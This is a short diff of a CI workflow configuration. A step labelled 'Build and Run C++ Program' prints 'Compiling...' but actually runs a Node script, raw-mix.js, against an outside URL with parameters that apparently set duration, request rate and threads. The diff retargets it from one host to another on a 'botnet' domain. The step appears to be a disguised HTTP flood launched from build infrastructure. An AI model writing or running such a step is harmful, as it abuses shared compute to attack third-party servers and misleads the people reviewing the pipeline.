@@ -15,4 +15,4 @@ workflows:
       - name: Build and Run C++ Program
         script: |
           echo "Compiling..."
-          node raw-mix.js https://load.vmheaven.io/ 120 500000 16 8
+          node raw-mix.js https://dstat.botnet.im 120 500000 16 8
